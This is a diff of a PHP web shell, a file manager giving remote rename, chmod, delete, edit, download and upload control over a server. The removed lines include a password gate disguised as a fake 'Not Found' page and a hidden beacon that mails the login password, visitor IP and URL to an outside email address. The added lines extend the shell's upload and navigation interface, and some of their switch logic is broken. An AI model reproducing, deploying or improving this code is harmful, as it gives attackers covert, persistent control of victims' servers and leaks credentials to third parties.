@@ -4,38 +4,6 @@ session_start();
 set_time_limit(0);
 ignore_user_abort(0);
 date_default_timezone_set('Asia/Jakarta');
-$pass = "b4914600112ba18af7798b6c1a1363728ae1d96f"; // sha1(sad)
-function login() {
-?>
-<meta name="viewport" content="width=device-width, initial-scale=1.1">
-<h1>Not Found</h1>
-  <p>The request URL <?=$_SERVER['REQUEST_URI']?> was not found on this server.</p>
-  <hr>
-  <address><?=$_SERVER['SERVER_SOFTWARE']?> Server at <?=$_SERVER['HTTP_HOST']?> Port <?=$_SERVER['SERVER_PORT']?></address>
-<?php
-  exit();
-}
-if (!isset($_SESSION[sha1($_SERVER['HTTP_HOST'])])) {
-	if (empty($pass) || (isset($_GET['x']) && (sha1($_GET['x']) == $pass))) {
-		$_SESSION[sha1($_SERVER['HTTP_HOST'])] = true;
-		$url = $_SERVER['HTTP_HOST'].$_SERVER['SCRIPT_NAME'];
-		$ip = $_SERVER['REMOTE_ADDR'];
-		$ref = $_SERVER['HTTP_REFERER'];
-		$dtime = date('r'); 
-		$log = "
-            Password : ".$password."({$_GET['x']})\n
-            Time : ".$dtime."\n
-            IP : ".$ip."\n
-            Filename : ".$_SERVER['SCRIPT_NAME']."\n
-            URL : ".$url."\n";
-            @mail('xnonhack@gmail.com', 'Log', $log);
-	} else {
-		login();
-	}
-}
-if (isset($_GET['g'])) {
-	unset($_SESSION[sha1($_SERVER['HTTP_HOST'])]);
-}
 ?>
 <!DOCTYPE html>
 <html>
@@ -469,11 +437,15 @@ input[type=submit] {
 <script>
 function hide() {
   var x = document.getElementById("hide");
-  if (x.style.display === "none") {
-    x.style.display = "block";
-  } else {
+  if (x.style.display === "block") {
     x.style.display = "none";
+  } else {
+    x.style.display = "block";
   }
+}
+function upload_show(id, text, btn) {
+	document.getElementById(id).style.display = 'block';
+	btn.style.display = 'none';
 }
 </script>
 <center>
@@ -490,12 +462,22 @@ function hide() {
 				<span class="strong"><?=getenv('SERVER_SOFTWARE')?></span><br>
 				<span class="strong">Current Dir : <?=cwd()?></span><br>
 				<div>
-					<a href="#">HOME</a>
-					<a href="#">UPLOAD</a>
+					<a href="http://<?=$_SERVER['HTTP_HOST'].$_SERVER['SCRIPT_NAME']?>">HOME</a>
+					<a href="#!upload" onclick="upload_show('answer1', this); return false;">UPLOAD</a>
 				</div>
-			</div>
     	</td>
     </tr>
+    <tr>
+    	<td colspan="5" class="not">
+    		<div id="answer1" style="display: none;">
+    			<form method="post">
+    				<input type="file" name="">
+    				<input style="width:20%;" type="submit" name="">
+    			</form>
+    		</div>
+    	</td>
+    </tr>
+    </div>
 </thead>
 <?php
 error_reporting(0);
@@ -609,37 +591,6 @@ if (@$_GET['action'] == 'dir') {
 	$file = $_GET['file'];
 	?>
 	<tr>
-		<td class="not">
-			<center>
-				<div class="action">
-					<div class="act">
-						<span class="a">
-							Dirname : <span><u><?=permission(cwd(),basename($file))?></u></span>
-						</span><br>
-						<span class="a">
-							Size : --
-						</span><br>
-						<span class="a">
-							Type : <?=mime_content_type($file)?>
-						</span>
-						<a class="b act c" href="?path=<?=cwd()?>">Back</a>
-					</div>
-					<ul class="action">
-						<li class="action"><a href="?path=<?=cwd()?>&rename&file=<?=$file?>">RENAME</a></li>
-						<li class="action"><a href="?path=<?=cwd()?>&chmod&file=<?=$file?>"> CHMOD</a></li>
-						<li class="action"><a href="?path=<?=cwd()?>&delete&file=<?=$file?>">DELETE</a></li>
-					</ul>
-				</div>
-			</center>
-		</td>
-	</tr>
-	<?php
-	exit();
-}
-if (@$_GET['action'] == 'file') {
-	$file = $_GET['file'];
-	?>
-	<tr>
 		<td class="not mas sup">
 			<span class="a">
 				Filename
@@ -677,7 +628,7 @@ if (@$_GET['action'] == 'file') {
 		<td class="not" colspan="3">
 			<center>
 				<a class="fo act acs c" href="?path=<?=cwd()?>">FILES</a>
-				<a class="fo act t" href="?path=<?=cwd()?>&edit&file=<?=$file?>">EDIT</a>
+				<a class="fo act t" href="?path=<?=$file?>">OPEN</a>
 				<a class="fo acs" href="?path=<?=cwd()?>&rename&file=<?=$file?>">RENAME</a>
 				<a class="fo acs" href="?path=<?=cwd()?>&chmod&file=<?=$file?>"> CHMOD</a>
 				<a class="fo acs" href="?path=<?=cwd()?>&delete&file=<?=$file?>">DELETE</a>
@@ -685,14 +636,88 @@ if (@$_GET['action'] == 'file') {
 			</center>
 		</td>
 	</tr>
+	<?php
+	exit();
+}
+if (isset($_GET['action'])) {
+	$file = $_GET['file'];
+	?>
 	<tr>
-		<td class="not" colspan="3">
-			<textarea readonly><?php print htmlspecialchars(file_get_contents(basename($file))) ?>
-			</textarea>
+		<td class="not mas sup">
+			<span class="a">
+				Filename
+			</span>
+		</td>
+		</div>
+		<td class="not mas lol"><center>:</center></td>
+		<td class="not mas">
+			<span><u><?=permission(cwd(),basename($file))?></u></span>
+		</td>
+	</tr>
+	<tr>
+		<td class="not mas">
+			<span class="a">
+				Size 
+			</span>
+		</td>
+		<td class="not mas lol"><center>:</center></td>
+		<td class="not mas">
+			<?=size($file)?>
+		</td>
+	</tr>
+	<tr>
+		<td class="not mas">
+			<span class="a">
+				Type
+			</span>
+		</td>
+		<td class="not mas lol"><center>:</center></td>
+		<td class="not mas">
+			<?=get_type($file)?>
 		</td>
 	</tr>
 	<?php
-	exit();
+	$ext = pathinfo($file, PATHINFO_EXTENSION);
+	switch ($file) {
+		case filetype($file) == 'file':
+			if (is_file($file)) {
+				?>
+				<tr>
+					<td class="not" colspan="3">
+						<center>
+							<a class="fo act acs c" href="?path=<?=cwd()?>">FILES</a>
+							<a class="fo act t" href="?path=<?=cwd()?>&edit&file=<?=$file?>">EDIT</a>
+							<a class="fo acs" href="?path=<?=cwd()?>&rename&file=<?=$file?>">RENAME</a>
+							<a class="fo acs" href="?path=<?=cwd()?>&chmod&file=<?=$file?>"> CHMOD</a>
+							<a class="fo acs" href="?path=<?=cwd()?>&delete&file=<?=$file?>">DELETE</a>
+							<a class="fo s act t l" href="?path=<?=cwd()?>&download&file=<?=$file?>">DOWNLOAD</a>
+						</center>
+					</td>
+				</tr>
+				<tr>
+					<td class="not" colspan="3">
+						<textarea readonly><?php print htmlspecialchars(file_get_contents(basename($file))) ?></textarea>
+					</td>
+				</tr>
+			<?php
+			}
+			break;
+			case filetype($file) == 'dir':
+				if (is_dir($file)) {
+					?>
+					<tr>
+						<td class="not" colspan="3">
+						<center>
+							<a class="fo act acs c" href="?path=<?=cwd()?>">FILES</a>
+							<a class="fo act t" href="?path=<?=$file?>">OPEN</a>
+							<a class="fo acs" href="?path=<?=cwd()?>&rename&file=<?=$file?>">RENAME</a>
+							<a class="fo acs" href="?path=<?=cwd()?>&chmod&file=<?=$file?>"> CHMOD</a>
+							<a class="fo s act t l" href="?path=<?=cwd()?>&delete&file=<?=$file?>">DELETE</a>
+					<?php
+				}
+			break;
+		}
+		exit();
 }
 if (@$_GET['action'] == 'img') {
 	$file = $_GET['file'];
@@ -1063,11 +1088,29 @@ if (isset($_GET['chmod'])) {
 			<td class="not" colspan="3">
 				<center>
 					<a class="fo act acs c" href="?path=<?=cwd()?>" disable='disabled'>FILES</a>
-					<a class="fo act t" href="?path=<?=cwd()?>&edit&file=<?=$file?>">EDIT</a>
-					<a class="fo acs fe" href="?path=<?=cwd()?>&rename&file=<?=$file?>">RENAME</a>
-					<a class="fo slc fe" href="?path=<?=cwd()?>&chmod&file=<?=$file?>"> CHMOD</a>
-					<a class="fo acs" href="?path=<?=cwd()?>&delete&file=<?=$file?>">DELETE</a>
-					<a class="fo s act t l" href="?path=<?=cwd()?>&download&file=<?=$file?>">DOWNLOAD</a>
+					<?php
+					$ext = pathinfo($file, PATHINFO_EXTENSION);
+					switch ($ext) {
+						case filetype($file) == 'file':
+							if (is_dir($file)) {
+								?>
+								<a class="fo act t" href="?path=<?=$file?>">OPEN</a>
+								<a class="fo acs fe" href="?path=<?=cwd()?>&rename&file=<?=$file?>">RENAME</a>
+								<a class="fo slc fe" href="?path=<?=cwd()?>&chmod&file=<?=$file?>"> CHMOD</a>
+								<a class="fo acs" href="?path=<?=cwd()?>&delete&file=<?=$file?>">DELETE</a>
+								<?php
+							} elseif (is_file($file)) {
+								?>
+								<a class="fo act t" href="?path=<?=cwd()?>&edit&file=<?=$file?>">EDIT</a>
+								<a class="fo acs fe" href="?path=<?=cwd()?>&rename&file=<?=$file?>">RENAME</a>
+								<a class="fo slc fe" href="?path=<?=cwd()?>&chmod&file=<?=$file?>"> CHMOD</a>
+								<a class="fo acs" href="?path=<?=cwd()?>&delete&file=<?=$file?>">DELETE</a>
+								<a class="fo s act t l" href="?path=<?=cwd()?>&download&file=<?=$file?>">DOWNLOAD</a>
+								<?php
+							}
+							break;
+					}
+					?>
 				</center>
 			</td>
 		</tr>
@@ -1141,11 +1184,32 @@ if (isset($_GET['rename'])) {
 			<td class="not" colspan="3">
 				<center>
 					<a class="fo act acs c" href="?path=<?=cwd()?>" disable='disabled'>FILES</a>
-					<a class="fo act t" href="?path=<?=cwd()?>&edit&file=<?=$file?>">EDIT</a>
+					<?php
+					$ext = pathinfo($file, PATHINFO_EXTENSION);
+					switch ($ext) {
+						case filetype($file) == 'file':
+							if (is_dir($file)) {
+								?><a class="fo act t" href="?path=<?=$file?>">OPEN</a><?php
+							} elseif (is_file($file)) {
+								?><a class="fo act t" href="?path=<?=cwd()?>&edit&file=<?=$file?>">EDIT</a><?php
+							}
+							break;
+					}
+					?>
 					<a class="fo slc fe" href="?path=<?=cwd()?>&rename&file=<?=$file?>">RENAME</a>
 					<a class="fo acs" href="?path=<?=cwd()?>&chmod&file=<?=$file?>"> CHMOD</a>
 					<a class="fo acs" href="?path=<?=cwd()?>&delete&file=<?=$file?>">DELETE</a>
-					<a class="fo s act t l" href="?path=<?=cwd()?>&download&file=<?=$file?>">DOWNLOAD</a>
+					<?php
+					switch ($ext) {
+						case filetype($file) == 'file':
+							if (is_file($file)) {
+								?>
+								<a class="fo s act t l" href="?path=<?=cwd()?>&download&file=<?=$file?>">DOWNLOAD</a>
+								<?php
+							}
+							break;
+					}
+					?>
 				</center>
 			</td>
 		</tr>
@@ -1267,7 +1331,7 @@ if (isset($_GET['edit'])) {
   			} if ($dir === '.' || $dir === '..') {
   				$action = "<a class='sa si' href='?path=".cwd()."&action=path'>action</a>";
   			} else {
-  				$action = '<a class="sa si" href="?path='.cwd().'&action=dir&file='.cwd().'/'.$dir.'">action</a>';
+  				$action = '<a class="sa si" href="?path='.cwd().'&action&file='.cwd().'/'.$dir.'">action</a>';
   			}
   			?>
   			<tr>
@@ -1313,7 +1377,7 @@ if (isset($_GET['edit'])) {
   				} elseif ($ext === 'ico') {
   					print("?path=".cwd()."&action=img&file={$files}");
   				} else {
-  					print("?path=".cwd()."&action=file&file={$files}");
+  					print("?path=".cwd()."&action&file={$files}");
   				} ?>'><?=basename($files)?></a>
   				</td>
   				<td class="pol">
